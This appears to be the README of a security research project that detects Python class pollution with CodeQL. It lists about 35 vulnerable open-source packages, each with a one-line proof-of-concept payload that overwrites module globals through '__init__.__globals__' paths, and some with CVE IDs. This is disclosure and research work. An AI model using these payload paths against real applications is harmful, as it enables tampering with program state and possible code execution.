## Python Class Pollution Vulnerability and its Gadgets

> The Python World-Class Pollution: Understanding the New Python Prototype Pollution Vulnerability and its Consequnces

### Install

1. Install the [CodeQL CLI](https://github.com/github/codeql-cli-binaries) and add it to the environment path.  

2. Run `install.sh`

### Run

Our tool uses "task" concept to help define the input, output, and configurations of an analysis task for better pipeline orchestration. All the tasks are located at `/tasks` path. To start any new analysis task, you should create a folder under the `/tasks` and update the `config.yml` within it following the template at `analyzer/new-config-example.yaml`.

1. Update the config file under the task folder (e.g., `task/your-new-task-name`):
  + `SCHEDULER.WORKSPACE`: The absolute path to the current task folder.
  + `CODEQL.CLI`: The absolute path to the codeql binary (`which codeql`).
  + `CLASS_POLLUTION_ANALYSIS.QUERIES`: The absolute path to the codeql query to want to execute.

2. Start the analyzer through the following command:

```
cd analyzer/src # This is important for python to resolve the modules
python3 run.py --config /absolute/path/to/tasks/<task-name>/config.yaml
```

### Class Pollution Vulnerabilities

This repository contains a list of packages that are vulnerable to class pollution (i.e., prototype pollution in Python) and class pollution gadgets that can result in severe issues like RCE.

| Name | Type | Stars | Version | Payloads | Input | Found By | Status | CVE |
|:-------:|:----:|:-----:|:-------:|----------|:-----:|:--------:|:------:|:---:|
| [pyinstrument](https://github.com/jackfromeast/python-class-pollution/blob/main/class-pollution/pyinstrument/README.md) | Lib | 6.8K | N/A | ```pyinstrument.vendor.keypath.set_value_at_keypath(obj, '__class__.__init__.__globals__.__name__', 'polluted')``` | Func | BlackPyrl | Pending | N/A |
| [Mesop](https://github.com/jackfromeast/python-class-pollution/blob/main/class-pollution/mesop/README.md) | App | 5.7K | v0.13.0 | ```mesop.dataclass_utils.dataclass_utils.update_dataclass_from_json(obj, '{"__init__"{"__globals__"{"__name__""polluted"}}}')``` | Remote | BlackPyrl | Pending | CVE-2025-30358 |
| [clearml](https://github.com/jackfromeast/python-class-pollution/blob/main/class-pollution/clearml/README.md) | App | 5.7K | v1.16.5 | ```clearml.automation.TaskScheduler.add_task(task_overrides={'__init__.__globals__.__builtins__.getattr''polluted'})``` | Func | BlackPyrl | Pending | N/A |
| [azure-cli](https://github.com/jackfromeast/python-class-pollution/blob/main/class-pollution/azure-cli/README.md) | App | 4.1K | v2.68.0 | ```az resource update --ids /subscriptions/2f5657fb-2e1b-4b1b-afd1-635a17df91c5/resourceGroups/Nothing_group/providers/Microsoft.Web/staticSites/Nothing --set __class__.__init__.__globals__.__name__=polluted``` | Local | BlackPyrl | Pending | [CVE-2025-24049](https://msrc.microsoft.com/update-guide/en-US/vulnerability/CVE-2025-24049) |
| [robusta](https://github.com/jackfromeast/python-class-pollution/blob/main/class-pollution/robusta/README.md) | App | 2.6K | 0.20.0 | ```update_item_attr(obj, '__init__.__globals__.__name__', 'polluted')``` | Func | Zhong | Pending | N/A |
| [IssacLab](https://github.com/jackfromeast/python-class-pollution/blob/main/class-pollution/issaclab/README.md) | Lib | 2.5K | v1.4.0 | ```omni.isaac.lab.utils.dict.update_class_from_dict(obj, {'__init__':{'__globals__':{'__name__':"polluted"}}})``` | Func | BlackPyrl | Pending | N/A |
| [django-unicorn](https://github.com/jackfromeast/python-class-pollution/blob/main/class-pollution/django-unicorn/README.md) | App | 2.4K | 0.61.0 | ```django_unicorn.views.action_parsers.utils.set_property_value(unicornViewObj, '__init__.__globals__["__name__"]', 'polluted')``` | Remote | Zhong | Pending | [CVE-2025-24370](https://github.com/adamghill/django-unicorn/security/advisories/GHSA-g9wf-5777-gq43) |
| [deepdiff](https://github.com/jackfromeast/python-class-pollution/blob/main/class-pollution/deepdiff/README.md) | Lib | 2K | v8.0.0 | ```{"attribute_added" {"root['x']"namedtuple, "root['x'].'__globals__'['_sys'].'__name__'""polluted"}}``` | Func | chilaxan | Accepted | CVE-2024-5254 |
| [glom](https://github.com/jackfromeast/python-class-pollution/blob/main/class-pollution/glom/README.md) | Lib | 1.9K | v24.11.0 | ```glom.assign(obj, '__init__.__globals__.__name__', 'polluted')``` | Func | BlackPyrl | Pending | N/A |
| [fixinventory](https://github.com/jackfromeast/python-class-pollution/blob/main/class-pollution/fixinventory/README.md) | App | 1.6K | 4.2.0 | ```ArgumentParser.args.config_override = ["configtest.__init__.__globals__.__name__=polluted"]; fixlib.config.Config.override_config(running_config)``` | Func | Zhong | Pending | N/A |
| [pydash](https://github.com/jackfromeast/python-class-pollution/blob/main/class-pollution/pydash/README.md) | Lib | 1.3K | v5.1.2 | ```pydash.set_(obj1, '__init__.__globals__.__name__', "polluted")``` | Func | abdulrah33m | Fixed | N/A |
| [OpenVINO™ Training Extensions](https://github.com/jackfromeast/python-class-pollution/blob/main/class-pollution/otx/README.md) | Lib | 1.2K | v2.2.2 | ```otx.engine.hpo.hpo_trial.set_using_dot_delimited_key("__init__.__globals__.__name__", "polluted", obj)``` | Func | BlackPyrl | Pending | N/A |
| [meta_dataset](https://github.com/jackfromeast/python-class-pollution/blob/main/class-pollution/meta_dataset/README.md) | Lib | 768 | N/A | ```_init_reference_module(Animal, {"typ":'cat',"age"11}, [['__init__','__globals__','__name__']], ['polluted'])``` | Func | Zhong | Pending | N/A |
| [JSPyBridge](https://github.com/jackfromeast/python-class-pollution/blob/main/class-pollution/JSPyBridge/README.md) | Lib | 718 | 1.2.1 | ```PyInterface.Set("", 0, ['python','__globals__','PyInterface'], ('__name__', 'polluted'))``` | Func | Zhong | Pending | N/A |
| [torchlens](https://github.com/jackfromeast/python-class-pollution/blob/main/class-pollution/torchlens/README.md) | Lib | 530 | 0.1.26 | ```torchlens.nested_assign(obj, [("attr", "__init__"), ("attr", "__globals__"), ("ind", "__name__") ], 'polluted')``` | Func | Zhong | Pending | N/A |
| [riven](https://github.com/jackfromeast/python-class-pollution/blob/main/class-pollution/riven/README.md) | App | 463 | v0.20.1 | ```media.item._set_nested_attr("__init__.__globals__.__name__", "polluted")``` | Func | BlackPyrl | Pending | N/A |
| [tournesol](https://github.com/jackfromeast/python-class-pollution/blob/main/class-pollution/tournesol/README.md) | CLI | 339 | N/A | ```set_attr("generative_model.__init__.__globals__.GenerativeModel.__name__", "polluted", generative_model, pipeline)``` | Func | Zhong | Pending | N/A |
| [pokitoki](https://github.com/jackfromeast/python-class-pollution/blob/main/class-pollution/pokitoki/README.md) | App | 315 | v210 | ```bot.config.ConfigEditor.set_value("openai.__init__.__globals__.__name__", "polluted")``` | Func | Zhong | Pending | N/A |
| [nebari](https://github.com/jackfromeast/python-class-pollution/blob/main/class-pollution/nebari/README.md) | App | 286 | 2024.12.1 | ```_nebari.config.set_nested_attribute(obj, ['__init__', '__globals__', '__name__'], 'polluted')``` | Func | BlackPyrl | Pending | N/A |
| [agentlab](https://github.com/jackfromeast/python-class-pollution/blob/main/class-pollution/agentlab/README.md) | App/Lib | 189 | v0.3.2 | ```_set_value(obj, ['__init__','__globals__', '__name__'], 'polluted')``` | Func | Zhong | Pending | N/A |
| [netchecks](https://github.com/jackfromeast/python-class-pollution/blob/main/class-pollution/netchecks/README.md) | App | 157 | v0.5.4 | ```apply_overrides(dst_obj, {'__init__'{'__globals__'{'V1PodTemplateSpec''polluted'}}})``` | Func | Zhong | Pending | N/A |
| [Jacinle](https://github.com/jackfromeast/python-class-pollution/blob/main/class-pollution/jacinle/README.md) | Lib | 135 | N/A | ```_KV('__init__.__globals__.__name__=polluted').apply(obj)``` | Func | Zhong | Pending | N/A |
| [uavSim](https://github.com/jackfromeast/python-class-pollution/blob/main/class-pollution/uavSim/README.md) | App | 121 | N/A | ```uavSim.utils.setattr_recursive("__init__/__globals__/__name__", "polluted")``` | Func | BlackPyrl | Pending | N/A |
| [edsnlp](https://github.com/jackfromeast/python-class-pollution/blob/main/class-pollution/edsnlp/README.md) | Lib | 119 | v0.15.0 | ```set_deep_attr(obj, '__init__.__globals__.__name__', 'polluted')``` | Func | Zhong | Pending | N/A |
| [gensphere](https://github.com/jackfromeast/python-class-pollution/blob/main/class-pollution/gensphere/README.md) | App | 112 | N/A | ```set_in_context(obj, ['__init__', '__globals__', '__name__'], 'polluted')``` | Func | Zhong | Pending | N/A |
| [genielibs](https://github.com/jackfromeast/python-class-pollution/blob/main/class-pollution/genielibs/README.md) | Lib | 109 | V24.9 | ```genie.libs.sdk.libs.utils.mapping.Mapping._modify_value(obj, ["__init__", "__globals__", "__name__"], 'polluted')``` | Func | BlackPyrl | Pending | N/A |
| [GCFT](https://github.com/jackfromeast/python-class-pollution/blob/main/class-pollution/GCFT/README.md) | App | 101 | N/A | ```set_instance_value(obj, [('attr', '__init__'), ('attr', '__globals__'), ('item', '__name__')], 'polluted')``` | Local | Zhong | Pending | N/A |
| [schemasheets](https://github.com/jackfromeast/python-class-pollution/blob/main/class-pollution/schemasheets/README.md) | CLI | 44 | 0.3.1 | ```set_attr_via_path_accessor(obj, ["__init__", "__globals__", "__name__"], 'polluted')``` | Local | Zhong | Pending | N/A |
| [laboneq](https://github.com/jackfromeast/python-class-pollution/blob/main/class-pollution/laboneq/README.md) | Lib | 39 | v2.44.0 | ```_override_qubit_parameters(obj, {'__init__.__globals__.__name__':'polluted'})``` | Func | Zhong | Pending | N/A |
| [magicattr](https://github.com/jackfromeast/python-class-pollution/blob/main/class-pollution/magicattr/README.md) | Lib | 17 | v3.9.0 | ```magicattr.set(bob, '__class__.__init__.__globals__["__name__"]', "polluted")``` | Func | BlackPyrl | Pending | N/A |
| [mo_dots](https://github.com/jackfromeast/python-class-pollution/blob/main/class-pollution/mo_dots/README.md) | Lib | 6 | 10.659.25005 | ```mo_dots.set_attr(obj, ["__class__", "__init__", "__globals__", "__name__"], 'polluted')``` | Func | BlackPyrl | Pending | N/A |
| [pystringattr](https://github.com/jackfromeast/python-class-pollution/blob/main/class-pollution/pystringattr/README.md) | Lib | 2 | N/A | ```pystringattr.setstrattr(obj, '__init__.__globals__["__name__"]', 'polluted')``` | Func | Zhong | Pending | N/A |
| [geodesic-api](https://github.com/jackfromeast/python-class-pollution/blob/main/class-pollution/geodesic-api/README.md) | Lib | N/A | 0.66.0 | ```desc = descriptors._BaseDescr("__init__.__globals__.obj"); desc.__set_name__(name="secret_key", owner=None); desc._set_object(obj, "polluted")``` | Func | Zhong | Pending | N/A |
| [dektools](https://github.com/jackfromeast/python-class-pollution/blob/main/class-pollution/dektools/README.md) | Lib | N/A | 0.2.59 | ```object_path_set(obj, '__init__.__globals__.__name__', 'polluted')``` | Func | Zhong | Pending | N/A |
| [steam-sdk](https://github.com/jackfromeast/python-class-pollution/blob/main/class-pollution/steam-sdk/README.md) | Lib | N/A | 2025.1.1 | ```rsetattr(obj, "__init__.__globals__.__name__", 'polluted')``` | Func | Zhong | Pending | N/A |
